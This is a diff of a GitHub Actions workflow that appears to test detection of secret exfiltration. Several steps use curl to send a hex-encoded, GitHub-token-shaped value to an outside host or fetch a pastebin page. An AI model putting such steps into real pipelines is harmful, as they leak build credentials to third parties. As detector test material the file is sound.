@@ -79,6 +79,13 @@ jobs:
           curl -X POST https://hexencodedsecrets.com \
           -H "Content-Type: application/json" \
           -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
+
+      - name: non web request body
+        run: |
+          curl -kL https://files.pythonhosted.org/packages/source/r/requests/requests-2.28.1.tar.gz -o requests-2.28.1.tar.gz \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
+          
       - name: secrets on response
         run: |
           curl -k https://pastebin.com/raw/V4FrgKcm
